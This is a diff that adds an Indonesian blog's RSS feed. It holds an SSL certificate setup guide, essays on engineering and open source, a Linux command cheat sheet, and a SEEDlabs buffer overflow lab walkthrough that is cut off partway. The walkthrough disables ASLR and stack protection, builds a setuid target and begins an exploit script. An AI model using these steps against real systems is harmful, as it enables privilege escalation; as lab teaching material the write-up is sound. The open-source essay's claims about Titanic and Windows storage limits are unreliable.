+  openssl req -x509 -new -nodes -key &quot;${tmp}/tmp.key&quot; -sha256 -days &quot;${DURATION}&quot; -out &quot;${OUTPATH}${FILENAME}_CA.pem&quot; -subj &quot;/C=${C}/ST=${ST}/L=${L}/O=${O}/OU=${OU}/CN=${CN}/emailAddress=${emailAddress}&quot;
+
+  # CSR Configuration
+  buildCsrCnf
+
+  # Create v3.ext configuration file
+  buildExtCnf
+
+  # Server key
+  openssl req -new -sha256 -nodes -out &quot;${OUTPATH}${FILENAME}.csr&quot; -newkey rsa:2048 -keyout &quot;${OUTPATH}${FILENAME}.key&quot; -config &lt;( cat &quot;${tmp}/tmp.csr.cnf&quot; )
+
+  # Server certificate
+  openssl x509 -req -in &quot;${OUTPATH}${FILENAME}.csr&quot; -CA &quot;${OUTPATH}${FILENAME}_CA.pem&quot; -CAkey &quot;${tmp}/tmp.key&quot; -CAcreateserial -out &quot;${OUTPATH}${FILENAME}.crt&quot; -days &quot;${DURATION}&quot; -sha256 -extfile &quot;${tmp}/v3.ext&quot;
+}
+
+checkVariables
+build
+# showVals
+safeExit
+</code></pre><p>hasilnya akan ada beberapa file yang tergenerate :</p>
+<ol>
+<li>ditoprabowo.crt</li>
+<li>ditoprabowo.csr</li>
+<li>ditoprabowo.key</li>
+<li>ditoprabowo_CA.pem</li>
+</ol>
+<p>Selanjutnya install sever certificate pada Apache</p>
+<ul>
+<li>
+<p>copy ca cert ke /etc/ssl/certs.</p>
+<pre><code>  $ sudo cp ditoprabowo_CA.pem /etc/ssl/certs/
+</code></pre>
+</li>
+<li>
+<p>copy server cert dan private key ke folder ssl</p>
+<pre><code>  $  cp ditoprabowo.crt /etc/ssl/certs/ditoprabowo.crt
+  $  cp ditoprabowo.key /etc/ssl/private/ditoprabowo.key
+</code></pre>
+</li>
+<li>
+<p>aktifkan SSL module</p>
+<pre><code>  $  a2enmod ssl
+</code></pre>
+</li>
+<li>
+<p>aktifkan SSL site in apache</p>
+<pre><code>  $ a2ensite default-ssl
+</code></pre>
+</li>
+<li>
+<p>ditambahkan certificate pada apache</p>
+<pre><code>    SSLCACertificateFile /etc/ssl/certs/ditoprabowo_CA.pem
+
+    SSLCertificateFile	/etc/ssl/certs/ditoprabowo.crt
+
+    SSLCertificateKeyFile /etc/ssl/private/ditoprabowo.key
+</code></pre>
+</li>
+<li>
+<p>Restart apache2</p>
+<pre><code>  $  sudo service apache2 restart
+</code></pre>
+</li>
+</ul>
+<p>pindahkan file ditoprabowo_CA.pem ke local laptop</p>
+<pre><code>    $  scp ditoprabowo_CA.pem dito@10.122.1.53:~
+</code></pre>
+<p>lalu pada browser, disini saya memakai chrome, klik setting &gt; manage certificate, pada root authorization import file diatas agar dikenali valid oleh chrome.</p>
+<p><img src="/img/webj4.png" alt=""></p>
+<p>hasilnya :</p>
+<p><img src="/img/webj5.png" alt=""></p>
+<p>Referensi :</p>
+<ol>
+<li>
+<p><a href="http://developer.erabelajar.com/konfigurasi-dns-server-menggunakan-bind9-di-ubuntu-server/">http://developer.erabelajar.com/konfigurasi-dns-server-menggunakan-bind9-di-ubuntu-server/</a></p>
+</li>
+<li>
+<p><a href="https://www.makethenmakeinstall.com/2014/05/ssl-client-authentication-step-by-step/">https://www.makethenmakeinstall.com/2014/05/ssl-client-authentication-step-by-step/</a></p>
+</li>
+<li>
+<p>Google Image</p>
+</li>
+<li>
+<p><a href="https://github.com/loganstellway/self-signed-ssl/blob/master/self-signed-tls">https://github.com/loganstellway/self-signed-ssl/blob/master/self-signed-tls</a></p>
+</li>
+</ol>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Apa Yang Seharusnya Dilakukan Oleh Seorang Engineer</title>
+            <link>/posts/apa-yang-seharusnya-dilakukan-oleh-seorang-engineer/</link>
+            <pubDate>Tue, 15 Oct 2019 05:08:35 +0700</pubDate>
+            
+            <guid>/posts/apa-yang-seharusnya-dilakukan-oleh-seorang-engineer/</guid>
+            <description>Apa sih Engineer itu? Engineer adalah suatu ilmu keteknikan yang dipraktekan dalam kehidupan kita untuk mempermudah kita dalam melakukan sesuatu. Seorang Engineer harus bisa mengatasi masalah yang ada dalam kehidupan sehari-hari dari hal yang kecil hingga besar. Ada beberapa sifat yang harus dimiliki oleh seorang Engineer, yang pertama Be Humble, jangan sombong, dan akui kesalahan. Seorang Engineer yang sombong tidak akan banyak ilmu, saat ada orang yang ingin mengajak belajar, apabila ia sombong dan merasa tidak bisa, maka kemungkinan besar Engineer itu akan menolak karena dirasa sudah bisa, padahal banyak ilmu ilmu baru yang bisa dipelajari.</description>
+            <content type="html"><![CDATA[<p>Apa sih Engineer  itu? Engineer adalah suatu ilmu keteknikan yang dipraktekan dalam kehidupan kita untuk mempermudah kita dalam melakukan sesuatu. Seorang Engineer harus bisa mengatasi masalah yang ada dalam kehidupan sehari-hari dari hal yang kecil hingga besar. Ada beberapa sifat yang harus dimiliki oleh seorang Engineer, yang pertama Be Humble, jangan sombong, dan akui kesalahan. Seorang Engineer yang sombong tidak akan banyak ilmu, saat ada orang yang ingin mengajak belajar, apabila ia sombong dan merasa tidak bisa, maka kemungkinan besar Engineer itu akan menolak karena dirasa sudah bisa, padahal banyak ilmu ilmu baru yang bisa dipelajari. Dan apabila ada orang yang menyalahkan kita dalam suatu masalah, akui kesalahan itu dan jangan sombong, bisa saja banyak ilmu ilmu yang kurang kita perhatikan dan akan berguna pada suatu hari.Yang kedua, seorang engineer harus bisa menganalisis suatu permasalahan, dan bisa memberikan solusi yang komprehensif.</p>
+<p>Agar seorang bisa menganalisis dan bisa memberika solusi yang komprehensif pastinya seorang enginer harus berwawasan yang luas. Untuk bisa berwawasan luas seorang engineer harus melikiki cara berfikir yang open mind, selalu mengelaborasi ( mengengbangkan lebih lanjut dari apa yang didapatkan ), jangan berasumsi selalu cari fakta fakta terhadap masalah yang dihadapi. Dan seorang Engineer yang hebat selalu melakukan homework nya dengan baik, tanpa menunda-nunda dan selalu bertanya apabila memang dirasa tidak tahu, jangan malu.  Seorang Engineer juga harus memiliki integritas yang tinggi, ya integritas, saat berpfikir dan diomongkan dalam publik, hasil dari pekerjaan yang dilakukan harus sesuai dengan apa yang dibicarakan. Dan Engineer harus bisa menjalankan  semua pekerjaan nya dengan properly, artinya ia  harus bisa meyakini dengan pengetahuan dan kemampuannya bahwa ia telah melakukan nya dengan baik dan benar. Jadi dengan hati yang bersih, pikiran yang berwawasan luas dan analisis yang bagus, disertai awareness dalam penyelesaian masalah, akan menjadikan seorang Engineer hebat dalam dunia bisnis serta mampu memberikan solusi yang komprehensif bagi client nya. Dan pastinya seorang Engineer yang baik juga mempunyai niat untuk membangun bangsa dan negara nya.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Open Source Sebagai Foundation Dari Industri 4.0</title>
+            <link>/posts/open-source-sebagai-foundation-dari-industri-4.0/</link>
+            <pubDate>Tue, 15 Oct 2019 05:06:54 +0700</pubDate>
+            
+            <guid>/posts/open-source-sebagai-foundation-dari-industri-4.0/</guid>
+            <description>Ya seperti yang kita ketahui sebelumnya, Open Source merupakan istilah untuk sofware yang mana kode dari sofware tersebut bisa kita pelajari, modifikasi, maupun kita kembangkan sesuai keinginan kita. Dan Open Source tanpa kita sadari merupakan foundation atau dasar berdirinya Industri 4.0, kok bisa? Sebelumnya, apakah kalian tahu apa itu Industri 4.0? Industri 4.0 merupakan istilah dimana sebuah IT menjadi kebutuhan pokok dan menjadi support untuk kehidupan kita. Pada Industri 4.0 sangat sangat mempermudah kita untuk melakukan sesuatu termasuk didalamnya sudah terjadi automation yang artinya sudah ada beberap fitur otomatis, contohnya login/register.</description>
+            <content type="html"><![CDATA[<p>Ya seperti yang kita ketahui sebelumnya, Open Source merupakan istilah untuk sofware yang mana kode dari sofware tersebut bisa kita pelajari, modifikasi, maupun kita kembangkan sesuai keinginan kita. Dan Open Source tanpa kita sadari merupakan foundation atau dasar berdirinya Industri 4.0, kok bisa?
+Sebelumnya, apakah kalian tahu apa itu Industri 4.0? Industri 4.0 merupakan istilah dimana sebuah IT menjadi kebutuhan pokok dan menjadi support untuk kehidupan kita. Pada Industri 4.0 sangat sangat mempermudah kita untuk melakukan sesuatu termasuk didalamnya sudah terjadi automation yang artinya sudah ada beberap fitur otomatis, contohnya login/register. Biasanya kita perlu menginputkan data kita untuk bisa login/register. Sekarang tanpa perlu kita menginputkan data, kita bisa login dan register dengan akun Google atau yang lainnya. Tidak hanya itu, sekarang banyak aplikasi yang menggantikan dompet/uang nyata dengan uang virtual. Kita bisa membayar lewat aplikasi dan tanpa perlu ribet dengan kembalian serta waktu transaksi yang cepat. Seolah  olah semua kebutuhan pokok kita dimudahkan dengan tergantikannya dengan IT. Balik lagi, semua perkembangan IT dalam industri 4.0 tidak semudah mungkin bisa sepesat ini tanpa adanya Open Source. Dengan adanya Open Source, banyak orang bisa mempelajari source code yang ada untuk menciptakan sesatu yang baru. Misalnya dengan adanya open source dari flutter kita bisa membuat aplikasi yang bagus sesuai dengan apa yang kita inginkan yang bisa memudahkan seseorang. Tanpa adanya open source akan kesulitan apabila seseorang membangun dari awal sebuah system yang kompleks. Selain kemudahan dalam mempelajari, kita juga dapat meminimalisir biaya yang dikeluarkan karena open source gratis. Apabila sudah ada open source dan ingin mengembangkan lagi industri di indonesia, tinggal mencari orang dari akademisi yang expert dan mau juga belajar untuk bisnis. Soalnya, kebanyakan orang akademisi tidak terlalu memperdulikan bisnis lebih ke arah risetnya. Jadi ada gap antara akademisi dan bisnis.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Open Source Adalah Keajaiban Dunia?</title>
+            <link>/posts/open-source-adalah-keajaiban-dunia/</link>
+            <pubDate>Tue, 15 Oct 2019 05:03:51 +0700</pubDate>
+            
+            <guid>/posts/open-source-adalah-keajaiban-dunia/</guid>
+            <description>Seperti yang kita ketahui, Open source adalah istilah untuk software yang kode programnya disediakan oleh pengembangan untuk umum agar dapat dipelajari, diubah, atau dikembangkan. Jadi dengan adanya Open Source kita bisa melihat kode program dan bisa kita modifikasi untuk apapun yang kita inginkan dengan gratis, ya gratis. Lalu kenapa Open Source menjadi sebuah keajaiban dunia?. Banyak kisah menarik dari perusahaan IT besar yang lahir dari Open source,bahkan tidak hanya dari perusahaan IT, banyak perusahaan yang sekarang sudah menjadi perusahaan besar karena adanya Open source.</description>
+            <content type="html"><![CDATA[<p>Seperti yang kita ketahui, Open source adalah istilah untuk software yang kode programnya disediakan oleh pengembangan untuk umum agar dapat dipelajari, diubah, atau dikembangkan. Jadi dengan adanya Open Source kita bisa melihat kode program dan bisa kita modifikasi untuk apapun yang kita inginkan dengan gratis, ya gratis. Lalu kenapa Open Source menjadi sebuah keajaiban dunia?. Banyak kisah menarik dari perusahaan IT besar yang lahir dari Open source,bahkan tidak hanya dari perusahaan IT, banyak perusahaan yang sekarang sudah menjadi perusahaan besar karena adanya Open source. Linux misalnya, salah satu operating system  open source yang dibuat oleh Linus Torvald, bayangkan apabila tidak ada linux apakah dunia IT akan seperti sekarang? Apa yang terjadi apabila hanya ada Windows milik microsoft yang apabila memilikinya harus membeli serta close source?</p>
+<p>Tidak akan, tidak akan lahir Android, Google, bahkan film Titanic yang begitu hits sampai sekarang tidak akan ada tanpa Open Source, kok bisa?
+Ya bisa, tahukan kalian sebenarnya Android itu merupakan operating system dengan mengadopsi OS linux? Android yang begitu banyak digunakan sekarang, diciptakan oleh Andy Rubin dan kawan kawan nya. Android awalnya berdiri dari perusahan Android Inc yang kemudian di beli oleh Google pada tahun 2005. Android diciptakan dari Open Source linux, dan Android sendiri bersifat Open Source agar para pengembang aplikasi bisa dengan mudah membuat aplikasi untuk diinstal dalam OS Android,jadi apabila tidak ada Open Source OS Linux apakah akan ada Android? dan apabila Android bersifat close source akankah Android akan berkembang pesat seperti sekarang? akan kah banyak yang bisa menciptakan aplikasi aplikasi dalam OS Android?</p>
+<p>Begitu juga dengan Google, Google pada awalnya adalah mesin search engine. Dimana yang dinamakan search engine perlu data yang banyak agar bisa membuktikan bahwa milik Google lah search engine yang tercepat. Untuk mempunyai data yang banyak, perlu banyak orang yang menggunakan internet dan komputer, dan yang namanya komputer harus memiliki os agar bisa berjalan. Bayangkan apabila hanya ada Windows milik microsoft yang berbayar pada dunia ini, pastinya akan sedikit orang yang mampu membeli windows, dan penyebaran data pun sedikit, dan IT pun akan lambat perkembangan nya apabila hanya ada windows pada dunia ini. Tapi, dengan adanya Linux OS yang bersifat Open Source, bakal banyak orang yang bisa memakai komputer dan bakal banyak juga data yang bisa menyebar serta terwujudlah perusahaan Google yang kalian tau sendiri seperti apa suksesnya.</p>
+<p>Tidak hanya perusahaan IT, bahkan film Titanic pun bisa sukses dan ada karena adanya Open Source. Pada jaman dahulu, penyimpanan media elektronik sangat sangat terbatas, tidak seperti sekarang, sedangkan agar bisa membuat film titanic, diperlukan penyimpanan sangat besar karena setiap frame yang bagus hasilnya menghasilkan data yang cukup besar, apabila hanya ada windows apakah akan ada film titanic? windows mempunya limit penyimpanan maksimal, dan harus menghabiskan biaya yang mahal untuk membuat windows bisa menyimpan memory yang besar. Untuk mengatasi masalah penyimpanan yang besar, dipangilah hacker untuk membuat linux memiliki penyimpanan yang besar dan bisa menghemat biaya produksi secara besar.</p>
+<p>Pada kenyataannya, membangun dan mengimplementasikan open source dalam dunia bisnis tidak semudah seperti membeli ke perusahaan sofware berbayar, jika kita memilih jalan membayar apabila ada error kita tinggal kontak penyedia, dan tidak ada perkembangan ilmu dalam masalah troubleshoot dan problem solving, biaya nya mahal juga, sangat tidak bijaksana. Belum lagi apabila penyedia memberikan sebuah kejahatan berupa virus ,malware atau spyware dalam sofware tersebut yang kita tidak mengetahuinya [Hidden Agenda]. Juga pada sofware berbayar tidak muncul keberagaman sofware antara pembuat, penjual, pengguna, dsb. Beda cerita jika memakai Open source, banyak sekali tantangan yang harus dihadapi dan dibutuhkan semangat besar open source. Pada penggunaan, bisa muncul beragam bentuk pada pencipta dan pemakai, belum lagi jika menginginkan beberapa fitur yang berbeda, semua orang bisa dengan mudah memodifikasi seperti apa yang diinginkan. Dalam implementasi nya juga, open source diimplementasikan dengan base practice, dari research (experiment) dan analisis, lalu mendapat experience kemudian saat dicoba di produksi mendapat feedback dan hasil, lalu dianalisis lagi dan mendapat experience lagi berulang ulang, tidaklah mudah. Sampai akhirnya timbulah SOP, timbullah Procedure bisa dikatan metodologi sampai muncul sebuah Guideline yang akhirnya mendekati maturity (kematangan) dalam implementasi open source. Belum lagi masalah legalitas,  kita bisa saja terkena pelanggaran hak cipta (copyright) , dimana vendor harus menjamin seluruh hukum dan denda apabila ada pelanggaran copyright, dan client tidak sama sekali harus membayar denda. Yang artinya kita harus benar benar memastikan bahwa tidak ada pelanggaran sama sekali dalam pengimplementasikan open source, baru kita profesional dalam menjalankan bisnis kita.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Linux_Basic_Admin</title>
+            <link>/posts/linux_basic_admin/</link>
+            <pubDate>Fri, 11 Oct 2019 20:51:34 +0700</pubDate>
+            
+            <guid>/posts/linux_basic_admin/</guid>
+            <description>Untuk orang yang baru dalam menggunakan linux, menggunakan linux secara optimal tidaklah sangat mudah, hal pertama yang harus kita ketahui adalah basic command menggunakan terminal.
+Berikut beberapa command yang telah kita rangkum : list Menampilkan list detail
+ ls -l  Menampilkan list keseluruhan (termasuk dot file)
+ ls -la  Menampilkan list berdasarkan waktu
+ ls -t  Menampilkan list berdasarkan ukuran file
+ ls -S  Menampilkan list berdasarkan tipe file</description>
+            <content type="html"><![CDATA[<p>Untuk orang yang baru dalam menggunakan linux, menggunakan linux secara optimal tidaklah sangat mudah, hal pertama yang harus kita ketahui adalah basic command menggunakan terminal.</p>
+<h3 id="berikut-beberapa-command-yang-telah-kita-rangkum-">Berikut beberapa command yang telah kita rangkum :</h3>
+<h4 id="list">list</h4>
+<p>Menampilkan list detail</p>
+<pre><code>      ls -l
+</code></pre>
+<p>Menampilkan list keseluruhan (termasuk dot file)</p>
+<pre><code>      ls -la
+</code></pre>
+<p>Menampilkan list berdasarkan waktu</p>
+<pre><code>      ls -t
+</code></pre>
+<p>Menampilkan list berdasarkan ukuran file</p>
+<pre><code>    ls -S
+</code></pre>
+<p>Menampilkan list berdasarkan tipe file</p>
+<pre><code>    ls -F
+</code></pre>
+<p>Menampilkan list dengan index file nya</p>
+<pre><code>    ls -i
+</code></pre>
+<h4 id="cat">cat</h4>
+<p>Print ke terminal isi dari file</p>
+<pre><code>    cat [ file ]
+</code></pre>
+<h4 id="mengubah-directori">Mengubah directori</h4>
+<p>Mengubah directori folder</p>
+<pre><code>  cd
+</code></pre>
+<h4 id="tail">Tail</h4>
+<p>Menampilkan baris akhir sebanyak n</p>
+<pre><code>  [perintah lain] | tail -n
+</code></pre>
+<p>Monitoring perubahan file</p>
+<pre><code>  tail -f [nama file]
+</code></pre>
+<h4 id="head">Head</h4>
+<p>Menampilkan baris awal sebanyak n</p>
+<pre><code>  [perintah lain] | head -n
+</code></pre>
+<h4 id="right-direction">Right Direction</h4>
+<p>Replace isi dari file output</p>
+<pre><code>  cat /proc/cpuinfo &gt; command.txt
+</code></pre>
+<h4 id="double-right-directioninsert-sesuatu-pada-file-output">Double Right DirectionInsert sesuatu pada file output</h4>
+<pre><code>  cat /proc/cpuinfo | wc -l &gt;&gt; command.txt
+</code></pre>
+<h4 id="left-direction">Left Direction</h4>
+<p>File sebagai input (yang diproses)</p>
+<pre><code>  ./program &lt; command.txt
+</code></pre>
+<h4 id="error-direction">Error Direction</h4>
+<p>Memasukkan error pada file output</p>
+<pre><code>    mkdir Music 2&gt; myerror.txt (replace)
+    mkdir Music 2&gt;&gt; myerror.txt (insert)
+</code></pre>
+<h4 id="sort">Sort</h4>
+<p>Mengurutkan isi file (per baris)</p>
+<pre><code>    sort -u [namafile]
+</code></pre>
+<h4 id="uniq">Uniq</h4>
+<p>Menghitung jumlah elemen per nilai dalam data</p>
+<pre><code>    uniq -c [namafile]
+</code></pre>
+<h4 id="grep">Grep</h4>
+<p>Mencari kata dalam suatu file</p>
+<pre><code>    [perintah] | grep [keyword]
+</code></pre>
+<h4 id="copy">Copy</h4>
+<p>Copy semua file dalam satu direktori</p>
+<pre><code>    cp * [direktori tujuan]
+</code></pre>
+<p>Copy semua file dan sub direktori</p>
+<pre><code>    cp -R * [direktori tujuan]
+</code></pre>
+<p>Copy file</p>
+<pre><code>    cp [namafile] [direktori tujuan]
+</code></pre>
+<p>Copy tanpa merubah date timestamps</p>
+<pre><code>    cp -p
+</code></pre>
+<h4 id="move">Move</h4>
+<p>Jika belum ada nama, membuat file baru. Jika sudah ada nama, memindahkan</p>
+<pre><code>    mv
+</code></pre>
+<h4 id="ssh">SSH</h4>
+<p>Komputer A SSH komputer B</p>
+<pre><code>    ssh B@ip
+</code></pre>
+<p>A kirim file ke B</p>
+<pre><code>    scp [nama file] B@ip:direktori
+</code></pre>
+<p>B mengambil file dari A</p>
+<pre><code>    scp A@ip:direktori [direktori lokal]
+</code></pre>
+<p>SSH tanpa password</p>
+<pre><code>    sshpass -p [password]
+</code></pre>
+<p>ssh dengan perintah</p>
+<pre><code>    A@ip [perintah]
+</code></pre>
+<h4 id="create-new-file">Create New File</h4>
+<p>Membuat file baru</p>
+<pre><code>    touch [nama file]
+</code></pre>
+<h4 id="check-direction">Check Direction</h4>
+<p>Menampilkan alamat direktori aktif</p>
+<pre><code>    pwd
+</code></pre>
+<h4 id="locate">Locate</h4>
+<p>Mencari file pada semua direktori</p>
+<pre><code>  locate [keyword]
+</code></pre>
+<h4 id="find">Find</h4>
+<p>Mencari file pada direktori aktif</p>
+<pre><code>  Find [keyword]
+</code></pre>
+<h4 id="remove">Remove</h4>
+<p>Menghapus folder yang kosong</p>
+<pre><code>  rmdir
+</code></pre>
+<p>Menghapus file</p>
+<pre><code>  rm [direktori file]
+</code></pre>
+<p>Menghapus semua isi direktori</p>
+<pre><code>  rm -r [direktori]
+</code></pre>
+<p>Menghapus Paksa semua isi dir (force)</p>
+<pre><code>  rm -rf [file / dir]
+</code></pre>
+<h4 id="check-ip-address">Check IP Address</h4>
+<p>Mengecek IP Addres</p>
+<pre><code>  ifconfig
+  ip address
+</code></pre>
+<h4 id="show-process">Show Process</h4>
+<p>Untuk melihat process status</p>
+<pre><code>  ps -ef
+</code></pre>
+<h4 id="check-env">Check env</h4>
+<p>Print Environment Variable</p>
+<pre><code>  env
+</code></pre>
+<h4 id="displays-and-updates-sorted-process-information">Displays and updates sorted process information</h4>
+<p>Menampilkan process secara update dan terurut</p>
+<pre><code>  top
+  htop
+</code></pre>
+<h4 id="shows-the-network-status">Shows the network status</h4>
+<p>Menampilkan status network</p>
+<pre><code>  netstat
+</code></pre>
+<h4 id="display-free-disk-space">Display free disk space</h4>
+<p>Menampilkan disk space yang bisa dipakai</p>
+<pre><code>  df -h
+</code></pre>
+<p>-h prints out the information in human-readable format</p>
+<h4 id="to-check-the-user-running-the-application">To check the user running the application</h4>
+<p>Melihat user id yang berjalan</p>
+<pre><code>  id
+</code></pre>
+<h4 id="change-permision">Change permision</h4>
+<p>Mengubah permision suatu File</p>
+<pre><code>  chmod [parameter] [file]
+</code></pre>
+<p>contoh : chmod +x bash.sh, chmod 777 bash.sh</p>
+<h4 id="dignslookup">dig/nslookup</h4>
+<p>dig (DNS lookup utility) or nslookup (query Internet name servers)</p>
+<pre><code>  dig equnix.asia
+  nslookup equnix.asia
+</code></pre>
+<h4 id="history">history</h4>
+<p>melihat history command</p>
+<pre><code>  history
+</code></pre>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Buffer_Overflow_Labs_From_SEEDlabs</title>
+            <link>/posts/buffer_overflow_labs_from_seedlabs/</link>
+            <pubDate>Fri, 11 Oct 2019 20:25:58 +0700</pubDate>
+            
+            <guid>/posts/buffer_overflow_labs_from_seedlabs/</guid>
+            <description>0x00 Intro Eksploitasi ini dikenal dengan input validation attack yang dapat mengakibatkan suatu sistem crash (buffer overflow) yaitu variabel yang tersedia pada aplikasi tidak dapat menampung input yang sengaja dibuat berlebihan. Kelebihannya dapat mengganti suatu nilai variable (sehingga kita bisa mengontrol nya) juga bisa mennganti suatu nilai return address dari sebuah program.
+0x01 Guide Disini saya menggunakan VM yang telah disediakan oleh SEEDlabs, untuk memasang vm dan sebagainya silakan kunjungi situs seedlab untuk melihat dokumentasi,cara install dan download vm nya.</description>
+            <content type="html"><![CDATA[<h2 id="0x00-intro">0x00 Intro</h2>
+<p>Eksploitasi ini dikenal dengan input validation attack yang dapat mengakibatkan suatu sistem crash (buffer overflow) yaitu variabel yang tersedia pada aplikasi tidak dapat menampung input yang sengaja dibuat berlebihan. Kelebihannya dapat mengganti suatu nilai variable (sehingga kita bisa mengontrol nya) juga bisa mennganti suatu nilai return address dari sebuah program.</p>
+<h2 id="0x01-guide">0x01 Guide</h2>
+<p>Disini saya menggunakan VM yang telah disediakan oleh SEEDlabs, untuk memasang vm dan sebagainya silakan kunjungi situs seedlab untuk melihat dokumentasi,cara install dan download vm nya.</p>
+<p>Untuk file yang dibutuhkan :</p>
+<ol>
+<li>
+<p>stack.c (the vulnerable program)</p>
+</li>
+<li>
+<p>call_shellcode.c</p>
+</li>
+<li>
+<p>Exploit.py (Buat Sendiri)</p>
+</li>
+</ol>
+<p>Untuk file stack.c dan call_shellcode.c sudah disediakan oleh seedlab, untuk exploit.py saya membuat sendiri payloadnya yang untuk injeksi.</p>
+<p>Kita bisa memasukan shellcode kedalam badfile tapi program belum bisa mengeksekusi shellcode karena return address program belum kita overflow dan diarahkan ke lokasi alamat shelccode, untuk itu kita harus menyari return address program, dan menggantinya dengan alamat shellcode.</p>
+<p>Untuk mencari return address bisa mudah kita cari menggunakan feature gdb-peda yaitu pattern, saat program kita jalankan kasih pattern yang sudah di generate, akan muncul invalid return address suatu alamat, lalu alamat itu akan di baca oleh gdb-peda dan akan menghasilkan angka berapa ofset yang harus kita isi padding(junk char) agar kita bisa memodifikasi return address.</p>
+<p>Untuk mencari alamat shellcode, debug program dengan gdb-peda lalu break pada salah satu address saat variable buffer terbuat, lalu bisa kita baca alamat buffer tersebut.</p>
+<p>Ketika sudah mendapat return address dan alamat shellcode, kita buat payload dan memasukannya kedalam badfile, setelah itu kita jalankan programnya stack. Apabila berhasil masuk ke dalam shell berarti buffer overflow berhasil.</p>
+<p>Adapun step step yang harus kita lakukan :</p>
+<ol>
+<li>
+<p>Mematikan Address Space Randomization pada VM.</p>
+</li>
+<li>
+<p>Mengcompile file stack.c dengan mematikan StackGuard Protection Scheme dan membuat shellcode di stack dapat di eksekusi (execstack).</p>
+</li>
+<li>
+<p>Mencoba dan memastikan dapat mengeksekusi shellcode dengan file call_shellcode.c</p>
+</li>
+<li>
+<p>Mencari offset untuk return address</p>
+</li>
+<li>
+<p>Mencari alamat Buffer</p>
+</li>
+<li>
+<p>Membuat Payload dan mengeksekusi</p>
+</li>
+</ol>
+<h2 id="0x02-lab">0x02 LAB</h2>
+<h3 id="task-1--exploiting-the-vulnerability">TASK 1 : Exploiting the Vulnerability</h3>
+<h4 id="1mematikan-address-space-randomization-pada-vm">1.Mematikan Address Space Randomization pada VM.</h4>
+<p>Mematikan ASLR dapat kita lakukan dengan command :</p>
+<pre><code>sudo sysctl -w kernel.randomize_va_space=0
+</code></pre>
+<p>Apabila kita tidak mematikan ASLR alamat alamat pada program akan berubah berubah dan kita akan agak kesulitan untuk melakukan buffer overflow</p>
+<h4 id="2mengcompile-file-stackc-dengan-mematikan-stackguard-protection-scheme-dan-membuat-shellcode-di-stack-dapat-di-eksekusi-execstack">2.Mengcompile file stack.c dengan mematikan StackGuard Protection Scheme dan membuat shellcode di stack dapat di eksekusi (execstack).</h4>
+<p>Secara default compiler gcc saat mengcompile menyalakan StackGuard Protection Scheme untuk mencegah user memasukan input lebih dari yang di definisikan, misal buffer[10] apabila kita memasukan lebih dari 10 character akan terdeteksi stack smasing.</p>
+<pre><code>*** stack smashing detected : ./stack terminated
+</code></pre>
+<p>Selain itu, agar shellcode bisa berjalan perlu -z execstack agar shellcode di stack dapat di eksekusi.</p>
+<p>Untuk command nya</p>
+<pre><code>gcc -o stack -z execstack -fno-stack-protector stack.c
+chmod 4755 stack
+</code></pre>
+<h4 id="3-mencoba-dan-memastikan-dapat-mengeksekusi-shellcode-dengan-file-call_shellcodec">3. Mencoba dan memastikan dapat mengeksekusi shellcode dengan file call_shellcode.c</h4>
+<p>Compile call_shellcode.c dengan menggunakan perintah :</p>
+<pre><code>gcc -z execstack -o call_shellcode call_shellcode.c
+</code></pre>
+<p>Setelah berhasil lalu jalankan program</p>
+<pre><code>./call_shellcode
+</code></pre>
+<p>Hasilnya :</p>
+<p><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h4 id="4-mencari-offset-untuk-return-address">4. Mencari offset untuk return address</h4>
+<p>Untuk mendebug program dalam linux bisa menggunakan gdb, namun untuk kasus binary exploitation akan lebih disarankan untuk menggunakan gdb-peda, karena mengandung beberapa feature tambahan untuk buffer overflow salah satunya yaitu pattern untuk mencari nilai offset return address.</p>
+<p>pada terminal lakukan gdb pada program stack</p>
+<pre><code>gdb -q stack
+</code></pre>
+<p>lalu buat pattern untuk mencari nilai offset return address</p>
+<pre><code>pattern create 40
+</code></pre>
+<p><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p>setelahnya buat file exploit.py dan masukan pattern ke dalam badfile</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
+
+<span style="color:#75715e"># Fill the content with NOP&#39;s</span>
+content <span style="color:#f92672">=</span> bytearray(<span style="color:#ae81ff">0x90</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">517</span>))
+content[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">40</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa&#34;</span>
+
+<span style="color:#75715e"># Write the content to badfile</span>
+file <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;badfile&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>)
+file<span style="color:#f92672">.</span>write(content)
+file<span style="color:#f92672">.</span>close()
+</code></pre></div><p>lalu jalankan(di terminal baru) dengan command  :</p>
+<pre><code>python exploit.py
+</code></pre>
+<p>akan muncul file bernama badfile, kemudian pada terminal gdb-peda jalankan dengan command run</p>
+<p>akan muncul invalid</p>
+<p><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p>nah kita bisa cari offset return addres nya dengan command pada gdb-peda :</p>
+<pre><code>pattern offset 0x61414145
+</code></pre>
+<p>lalu akan muncul jumlah ofset yang perlu kita ketahui</p>
+<p><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h4 id="5mencari-alamat-buffer">5.Mencari alamat Buffer</h4>
+<p>setelah kita tau offset nya, kita perlu mencari tau alamat buffer nya, masuk ke gdb-peda dan lihat code diassambly nya</p>
+<pre><code>$ gdb -q stack
+gdb-peda$ pdisass main
+</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Dump of assembler code <span style="color:#66d9ef">for</span> function main:
